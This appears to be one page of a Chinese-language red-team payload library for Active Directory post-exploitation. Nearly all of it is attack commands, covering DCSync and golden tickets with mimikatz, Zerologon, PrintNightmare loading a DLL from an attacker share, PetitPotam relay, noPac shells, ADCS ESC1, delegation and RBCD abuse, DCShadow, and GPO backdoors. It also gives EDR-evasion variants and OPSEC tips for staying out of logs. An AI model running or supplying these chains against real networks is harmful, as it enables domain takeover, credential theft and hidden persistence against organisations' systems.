# 内网/后渗透 — 域渗透攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ SRC 场景下大多受限,见 [../compliance.md](../compliance.md)
> 涵盖:Kerberoasting / AS-REP / Golden Ticket / Silver Ticket / DCSync / Constrained Delegation / Unconstrained / Resource-Based / NoPac

---

### 域内权限提升路径  `domain-privilege-escalation`
利用ACL错误配置进行域权限提升
子类：**权限提升** · tags: `acl` `privilege` `active-directory` `escalation`

**前置条件：** 域环境；普通域用户凭证；BloodHound分析结果

**攻击链：**

**1. BloodHound分析**
_查询到域管理员的最短路径_
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**2. 查找WriteDACL**  _[windows]_
_查找WriteDACL权限_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**3. 利用WriteDACL**  _[windows]_
_添加DCSync权限_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**4. 执行DCSync**  _[windows]_
_执行DCSync获取域管哈希_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**5. 查找GenericAll**  _[windows]_
_查找GenericAll权限_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**6. 重置密码**  _[windows]_
_重置目标用户密码_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR 绕过变体：**

**1. 隐蔽操作**
_指定域控制器操作_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```

**分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。

**OPSEC：** ACL修改会产生日志；优先使用隐蔽的权限；BloodHound可以发现攻击路径

---

### 跨域信任攻击  `domain-cross-trust`
利用域信任关系进行跨域攻击
子类：**跨域攻击** · tags: `trust` `cross-domain` `active-directory` `forest`

**前置条件：** 已获取源域权限；存在域信任关系；目标域信息

**攻击链：**

**1. 枚举信任关系**  _[windows]_
_枚举域信任关系_
```
Get-NetDomainTrust
```

**2. 枚举森林信任**  _[windows]_
_枚举森林信任关系_
```
Get-NetForestTrust
```

**3. 跨域用户枚举**  _[windows]_
_枚举目标域用户_
```
Get-NetUser -Domain target.domain.com
```

**4. 跨域组枚举**  _[windows]_
_枚举目标域组_
```
Get-NetGroup -Domain target.domain.com
```

**5. SID History攻击**  _[windows]_
_利用SID History跨域提权_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```

**6. 跨域票据**  _[windows]_
_请求目标域票据_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

**EDR 绕过变体：**

**1. 隐蔽跨域**
_指定目标域控制器枚举_
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```

**分析：** 跨域信任攻击可以利用信任关系从低安全域向高安全域移动。

**OPSEC：** 跨域攻击会产生日志；SID History需要特殊权限；森林信任更安全

---

### Zerologon攻击  `zerologon`
CVE-2020-1472 Netlogon提权
子类：**Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**前置条件：** 可访问域控制器RPC

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python zerologon_tester.py DC_NAME DC_IP
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python zerologon_exploit.py DC_NAME DC_IP
将DC密码置空
```

**3. 导出哈希**  _[linux]_
_导出哈希_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
导出域内所有哈希
```

**4. 恢复密码**  _[linux]_
_恢复密码_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
恢复域控密码避免破坏
```

---

### PrintNightmare攻击  `printnightmare`
CVE-2021-34527 打印服务漏洞
子类：**PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**前置条件：** 可访问打印服务RPC

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测打印服务_
```
rpcdump.py @DC_IP | grep MS-RPRN
检查打印服务是否可用
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
加载恶意DLL获取SYSTEM权限
```

**3. Impacket利用**  _[linux]_
_使用Impacket_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
触发加载远程DLL
```

---

### PetitPotam攻击  `petitpotam`
CVE-2021-36942 强制认证攻击
子类：**PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**前置条件：** 可访问EFSRPC接口

**攻击链：**

**1. 启动中继**  _[linux]_
_启动NTLM中继_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
设置NTLM中继到ADCS
```

**2. 触发认证**  _[linux]_
_触发认证_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
强制DC向攻击者认证
```

**3. 获取证书**  _[linux]_
_获取证书_
```
中继成功后获取用户证书
使用证书进行Pass-the-Cert
```

---

### noPac/SAMAccountName攻击  `samaccountname`
CVE-2021-42278/CVE-2021-42287 域提权
子类：**noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**前置条件：** 普通域用户权限

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_利用漏洞_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取域管权限
```

**3. 攻击原理**
_攻击原理_
```
1. 创建机器账户(名称类似DC)
2. 清除SPN
3. 请求TGT
4. 删除机器账户
5. 获取域管TGT
```

---

### ADCS滥用攻击  `adcs-abuse`
Active Directory证书服务滥用
子类：**ADCS** · tags: `adcs` `certificate` `domain`

**前置条件：** ADCS服务可访问

**攻击链：**

**1. 枚举ADCS**  _[linux]_
_枚举ADCS配置_
```
certipy find -u user@domain -p password -dc-ip DC_IP
枚举证书模板
```

**2. 请求用户证书**  _[linux]_
_请求证书_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
请求用户证书
```

**3. Pass-the-Cert**  _[linux]_
_使用证书认证_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
使用证书获取TGT
```

**4. Rubeus请求**  _[windows]_
_Rubeus利用_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
使用Rubeus请求TGT
```

---

### ADCS ESC1漏洞  `adcs-esc1`
证书模板ESC1滥用
子类：**ADCS** · tags: `adcs` `esc1` `certificate`

**前置条件：** 存在ESC1配置的模板

**攻击链：**

**1. 识别ESC1**  _[linux]_
_识别漏洞模板_
```
certipy find -u user@domain -p password -vulnerable
查找ESC1漏洞模板
```

**2. 利用ESC1**  _[linux]_
_请求域管证书_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
指定SAN为域管
```

**3. 认证为域管**  _[linux]_
_认证为域管_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
使用证书认证为域管
```

---

### 约束委派攻击  `constrained-delegation`
利用约束委派进行横向移动
子类：**委派攻击** · tags: `delegation` `constrained` `kerberos`

**前置条件：** 存在约束委派配置的账户

**攻击链：**

**1. 查找约束委派**  _[windows]_
_查找约束委派账户_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
或
bloodhound查询
```

**2. 获取服务票据**  _[windows]_
_S4U2Self + S4U2Proxy_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
获取域管的服务票据
```

**3. 使用票据**  _[windows]_
_注入票据_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
注入票据并访问服务
```

---

### 基于资源的约束委派  `resource-delegation`
利用RBCD进行权限提升
子类：**委派攻击** · tags: `rbcd` `delegation` `kerberos`

**前置条件：** 对目标对象有WriteDACL权限

**攻击链：**

**1. 创建机器账户**  _[windows]_
_创建机器账户_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
创建新的机器账户
```

**2. 配置RBCD**  _[windows]_
_配置RBCD_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
设置委派关系
```

**3. 利用RBCD**  _[windows]_
_利用RBCD_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
获取域管票据
```

---

### DCShadow攻击  `dcshadow-attack`
伪造域控制器注入数据
子类：**DCShadow** · tags: `dcshadow` `domain` `injection`

**前置条件：** 域管理员权限；可注册新DC

**攻击链：**

**1. 注册伪造DC**  _[windows]_
_注册伪造DC_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
注册伪造DC并修改对象属性
```

**2. 推送更改**  _[windows]_
_推送更改_
```
在另一个终端:
mimikatz # lsadump::dcshadow /push
推送更改到真实DC
```

**3. 常见利用**  _[windows]_
_常见利用场景_
```
修改用户组:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
添加SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```

---

### 组策略滥用  `group-policy-abuse`
滥用组策略进行横向移动
子类：**组策略** · tags: `gpo` `group-policy` `domain`

**前置条件：** GPO编辑权限

**攻击链：**

**1. 查找可编辑GPO**  _[windows]_
_查找可编辑GPO_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
查找Domain Users可编辑的GPO
```

**2. 添加计划任务**  _[windows]_
_添加计划任务_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
添加立即执行的计划任务
```

**3. 添加注册表项**  _[windows]_
_添加注册表启动项_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```

---

### SAM The Admin攻击  `sam-the-admin`
CVE-2021-42278/CVE-2021-42287域提权
子类：**SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**前置条件：** 域用户权限；域控制器存在漏洞

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取域控权限_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取SYSTEM Shell
```

**3. 执行命令**  _[linux]_
_执行命令_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```

---

### NoAuth攻击  `noauth`
CVE-2022-33679 Kerberos认证绕过
子类：**NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**前置条件：** 域用户权限；目标账户有RC4密钥

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取TGT_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
获取目标用户TGT
```

**3. 使用TGT**  _[linux]_
_使用获取的TGT_
```
设置KRB5CCNAME环境变量
export KRB5CCNAME=administrator.ccache
使用psexec.py等工具
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`13-evasion.md`](13-evasion.md) · 下一篇:[`15-tunneling.md`](15-tunneling.md)
